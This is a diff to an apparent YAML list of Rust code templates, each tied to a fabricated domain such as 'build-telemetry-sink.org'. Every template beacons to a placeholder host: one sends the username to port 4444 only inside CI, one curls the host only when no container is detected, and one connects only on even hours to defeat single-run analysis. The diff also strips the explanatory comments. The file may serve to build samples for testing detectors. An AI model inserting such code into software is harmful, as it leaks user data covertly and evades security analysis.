@@ -11,15 +11,13 @@ variants:
     domain_fabricated: "build-telemetry-sink.org"
     code_template: |
       fn {fn_name}() {
-          // Check for continuous integration environment indicators
-          let in_ci = std::env::var("CI").is_ok()
-              || std::env::var("GITHUB_ACTIONS").is_ok()
-              || std::env::var("GITLAB_CI").is_ok();
+          use std::net::TcpStream;
+          use std::io::Write;
+          let in_ci = ["CI", "GITHUB_ACTIONS", "GITLAB_CI"].iter().any(|k| std::env::var(k).is_ok());
           if in_ci {
-              if let Ok(mut stream) = std::net::TcpStream::connect("{target_host}:4444") {
-                  use std::io::Write;
+              if let Ok(mut stream) = TcpStream::connect("{target_host}:4444") {
                   let user = std::env::var("USER").unwrap_or_default();
-                  let _ = stream.write_all(format!("CI_BEACON: {user}\n").as_bytes());
+                  write!(stream, "CI_BEACON: {user}\n").ok();
               }
           }
       }
@@ -31,13 +29,12 @@ variants:
     domain_fabricated: "cloud-audit-logger.net"
     code_template: |
       fn {fn_name}() {
-          let has_docker = std::path::Path::new("/.dockerenv").exists();
-          let has_cgroup = std::fs::read_to_string("/proc/1/cgroup")
-              .map(|s| s.contains("docker") || s.contains("containerd"))
-              .unwrap_or(false);
-          if !has_docker && !has_cgroup {
-              let url = ["http://", "{target_host}", "/active"].concat();
-              let _ = std::process::Command::new("curl").arg("-s").arg(&url).spawn();
+          use std::process::Command;
+          use std::fs;
+          let is_sandbox = std::path::Path::new("/.dockerenv").exists()
+              || fs::read_to_string("/proc/1/cgroup").map(|s| s.contains("docker")).unwrap_or(false);
+          if !is_sandbox {
+              Command::new("curl").arg("-s").arg("http://{target_host}/active").spawn().ok();
           }
       }
 
@@ -48,12 +45,10 @@ variants:
     domain_fabricated: "infra-sync-dispatcher.io"
     code_template: |
       fn {fn_name}() {
+          use std::net::TcpStream;
           if let Ok(dur) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
-              // Execute only on even hours to defeat single-run analysis
               if (dur.as_secs() / 3600) % 2 == 0 {
-                  let host_bytes: [u8; 15] = [0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x5f, 0x68, 0x6f, 0x73, 0x74, 0x2e, 0x63, 0x6f, 0x6d];
-                  let target = "{target_host}";
-                  let _ = std::net::TcpStream::connect((target, 8080));
+                  TcpStream::connect(("{target_host}", 8080)).ok();
               }
           }
       }
